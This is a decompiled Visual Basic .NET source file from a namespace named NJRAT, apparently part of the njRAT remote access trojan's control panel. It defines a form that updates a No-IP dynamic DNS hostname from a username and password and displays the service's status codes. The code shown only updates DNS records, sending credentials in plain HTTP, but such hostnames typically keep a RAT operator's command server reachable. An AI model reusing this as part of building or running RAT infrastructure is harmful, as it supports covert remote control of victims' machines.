Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x0200001B RID: 27
	<DesignerGenerated()>
	Public Partial Class NOIP
		Inherits Form

		' Token: 0x06000413 RID: 1043 RVA: 0x0016ACAC File Offset: 0x001690AC
		<DebuggerNonUserCode()>
		Public Sub New()
			NOIP.__ENCAddToList(Me)
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000414 RID: 1044 RVA: 0x0016ACC4 File Offset: 0x001690C4
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = NOIP.__ENCList
			SyncLock _ENCList
				Dim flag As Boolean = NOIP.__ENCList.Count = NOIP.__ENCList.Capacity
				If flag Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = NOIP.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = NOIP.__ENCList(num4)
						flag = weakReference.IsAlive
						If flag Then
							Dim flag2 As Boolean = num4 <> num
							If flag2 Then
								NOIP.__ENCList(num) = NOIP.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					NOIP.__ENCList.RemoveRange(num, NOIP.__ENCList.Count - num)
					NOIP.__ENCList.Capacity = NOIP.__ENCList.Count
				End If
				NOIP.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x1700017D RID: 381
		' (get) Token: 0x06000417 RID: 1047 RVA: 0x0016B52C File Offset: 0x0016992C
		' (set) Token: 0x06000418 RID: 1048 RVA: 0x0016B544 File Offset: 0x00169944
		Friend Overridable Property LinkLabel1 As LinkLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._LinkLabel1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As LinkLabel)
				Dim value2 As LinkLabelLinkClickedEventHandler = AddressOf Me.LinkLabel1_LinkClicked
				Dim flag As Boolean = Me._LinkLabel1 IsNot Nothing
				If flag Then
					RemoveHandler Me._LinkLabel1.LinkClicked, value2
				End If
				Me._LinkLabel1 = value
				flag = (Me._LinkLabel1 IsNot Nothing)
				If flag Then
					AddHandler Me._LinkLabel1.LinkClicked, value2
				End If
			End Set
		End Property

		' Token: 0x1700017E RID: 382
		' (get) Token: 0x06000419 RID: 1049 RVA: 0x0016B5A4 File Offset: 0x001699A4
		' (set) Token: 0x0600041A RID: 1050 RVA: 0x0016B5BC File Offset: 0x001699BC
		Friend Overridable Property RichTextBox2 As RichTextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._RichTextBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RichTextBox)
				Me._RichTextBox2 = value
			End Set
		End Property

		' Token: 0x1700017F RID: 383
		' (get) Token: 0x0600041B RID: 1051 RVA: 0x0016B5C8 File Offset: 0x001699C8
		' (set) Token: 0x0600041C RID: 1052 RVA: 0x0016B5E0 File Offset: 0x001699E0
		Friend Overridable Property RichTextBox1 As RichTextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._RichTextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RichTextBox)
				Me._RichTextBox1 = value
			End Set
		End Property

		' Token: 0x17000180 RID: 384
		' (get) Token: 0x0600041D RID: 1053 RVA: 0x0016B5EC File Offset: 0x001699EC
		' (set) Token: 0x0600041E RID: 1054 RVA: 0x0016B604 File Offset: 0x00169A04
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim flag As Boolean = Me._Button1 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				flag = (Me._Button1 IsNot Nothing)
				If flag Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000181 RID: 385
		' (get) Token: 0x0600041F RID: 1055 RVA: 0x0016B664 File Offset: 0x00169A64
		' (set) Token: 0x06000420 RID: 1056 RVA: 0x0016B67C File Offset: 0x00169A7C
		Friend Overridable Property TextBox3 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox3 = value
			End Set
		End Property

		' Token: 0x17000182 RID: 386
		' (get) Token: 0x06000421 RID: 1057 RVA: 0x0016B688 File Offset: 0x00169A88
		' (set) Token: 0x06000422 RID: 1058 RVA: 0x0016B6A0 File Offset: 0x00169AA0
		Friend Overridable Property TextBox2 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox2 = value
			End Set
		End Property

		' Token: 0x17000183 RID: 387
		' (get) Token: 0x06000423 RID: 1059 RVA: 0x0016B6AC File Offset: 0x00169AAC
		' (set) Token: 0x06000424 RID: 1060 RVA: 0x0016B6C4 File Offset: 0x00169AC4
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox1 = value
			End Set
		End Property

		' Token: 0x17000184 RID: 388
		' (get) Token: 0x06000425 RID: 1061 RVA: 0x0016B6D0 File Offset: 0x00169AD0
		' (set) Token: 0x06000426 RID: 1062 RVA: 0x0016B6E8 File Offset: 0x00169AE8
		Friend Overridable Property PictureBox1 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox1 = value
			End Set
		End Property

		' Token: 0x06000427 RID: 1063 RVA: 0x0016B6F4 File Offset: 0x00169AF4
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim utf8Encoding As UTF8Encoding = New UTF8Encoding()
			Dim [string] As String = utf8Encoding.GetString(webClient.DownloadData(String.Concat(New String() { "http://dynupdate.no-ip.com/dns?username=", Me.TextBox1.Text, "&password=", Me.TextBox2.Text, "&hostname=", Me.TextBox3.Text })))
			Dim array As String() = [string].Split(New Char() { ":"c })
			Me.RichTextBox1.Text = array(1)
			Dim flag As Boolean = array(1).Contains("0")
			If flag Then
				Me.RichTextBox2.Text = "Success - IP address is current, no update performed"
			End If
			flag = array(1).Contains("1")
			If flag Then
				Me.RichTextBox2.Text = "Success - DNS hostname update successful"
			End If
			flag = array(1).Contains("2")
			If flag Then
				Me.RichTextBox2.Text = "Error - Hostname supplied does not exist"
			End If
			flag = array(1).Contains("3")
			If flag Then
				Me.RichTextBox2.Text = "Error - Invalid username"
			End If
			flag = array(1).Contains("4")
			If flag Then
				Me.RichTextBox2.Text = "Error - Invalid password"
			End If
			flag = array(1).Contains("5")
			If flag Then
				Me.RichTextBox2.Text = "Error - Too many updates sent. Updates are blocked   until 1 hour passes since last status of 5 returned."
			End If
			flag = array(1).Contains("6")
			If flag Then
				Me.RichTextBox2.Text = "Error - Account disabled due to violation of No-IP   terms of service. Our terms of service can be viewed at   http://www.no-ip.com/legal/tos"
			End If
			flag = array(1).Contains("7")
			If flag Then
				Me.RichTextBox2.Text = "Error - Invalid IP. Invalid IP submitted is   improperly formated, is a private LAN RFC 1918 address, or an abuse   blacklisted address."
			End If
			flag = array(1).Contains("8")
			If flag Then
				Me.RichTextBox2.Text = "Error - Disabled / Locked hostname"
			End If
			flag = array(1).Contains("9")
			If flag Then
				Me.RichTextBox2.Text = "Host updated is configured as a web redirect and no update was performed."
			End If
			flag = array(1).Contains("10")
			If flag Then
				Me.RichTextBox2.Text = "Error - Group supplied does not exist"
			End If
			flag = array(1).Contains("11")
			If flag Then
				Me.RichTextBox2.Text = "Success - DNS group update is successful"
			End If
			flag = array(1).Contains("12")
			If flag Then
				Me.RichTextBox2.Text = "Success - DNS group is current, no update performed."
			End If
			flag = array(1).Contains("13")
			If flag Then
				Me.RichTextBox2.Text = "Error - Update client support not available for supplied hostname or group"
			End If
			flag = array(1).Contains("14")
			If flag Then
				Me.RichTextBox2.Text = "Error - Hostname supplied does not have offline   settings configured. Returned if sending offline=YES on a host that  does  not have any offline actions configured."
			End If
			flag = array(1).Contains("99")
			If flag Then
				Me.RichTextBox2.Text = "Error - Client disabled. Client should exit and not   perform any more updates without user intervention."
			End If
			flag = array(1).Contains("100")
			If flag Then
				Me.RichTextBox2.Text = "Error - User input error usually returned if missing required request parameters"
			End If
		End Sub

		' Token: 0x06000428 RID: 1064 RVA: 0x0016BA14 File Offset: 0x00169E14
		Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs)
			Process.Start("http://www.noip.com")
		End Sub

		' Token: 0x040001E1 RID: 481
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x040001E3 RID: 483
		<AccessedThroughProperty("LinkLabel1")>
		Private _LinkLabel1 As LinkLabel

		' Token: 0x040001E4 RID: 484
		<AccessedThroughProperty("RichTextBox2")>
		Private _RichTextBox2 As RichTextBox

		' Token: 0x040001E5 RID: 485
		<AccessedThroughProperty("RichTextBox1")>
		Private _RichTextBox1 As RichTextBox

		' Token: 0x040001E6 RID: 486
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x040001E7 RID: 487
		<AccessedThroughProperty("TextBox3")>
		Private _TextBox3 As TextBox

		' Token: 0x040001E8 RID: 488
		<AccessedThroughProperty("TextBox2")>
		Private _TextBox2 As TextBox

		' Token: 0x040001E9 RID: 489
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

		' Token: 0x040001EA RID: 490
		<AccessedThroughProperty("PictureBox1")>
		Private _PictureBox1 As PictureBox
	End Class
End Namespace
